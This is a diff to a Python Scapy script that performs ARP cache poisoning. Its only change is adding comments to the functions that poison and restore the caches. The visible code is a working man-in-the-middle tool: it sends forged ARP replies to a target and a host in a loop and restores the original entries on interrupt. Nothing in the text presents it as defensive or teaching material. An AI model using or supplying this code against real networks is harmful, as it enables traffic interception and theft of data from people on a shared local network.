@@ -11,11 +11,11 @@ def getMAC(ip):     # Get MAC of machine given it's IP
     result = srp(packet, timeout=3, verbose=False)
     return result[0][0][1].hwsrc
 
-def poison(targetIP, targetMAC, sourceIP):
+def poison(targetIP, targetMAC, sourceIP):      # Poison ARP cache
     packet = ARP(op=2 , pdst=targetIP, psrc=sourceIP, hwdst= targetMAC)
     send(packet, verbose= False)
 
-def restore(targetIP, targetMAC, sourceIP, sourceMAC):
+def restore(targetIP, targetMAC, sourceIP, sourceMAC):      # Restore ARP cache to pre-poisoned state
     packet = ARP(op=2 , hwsrc=sourceMAC , psrc= sourceIP, hwdst= targetMAC , pdst= targetIP)
     send(packet, verbose=False)
 
@@ -36,6 +36,6 @@ if __name__ == '__main__':
             poison(targetIP, targetMAC, hostIP)
             poison(hostIP, hostMAC, targetIP)
             sleep(2)
-    except KeyboardInterrupt:
+    except KeyboardInterrupt:       # Signal to restore ARP and exit
         restore(targetIP, targetMAC, hostIP, hostMAC)
         restore(hostIP, hostMAC, targetIP, targetMAC)
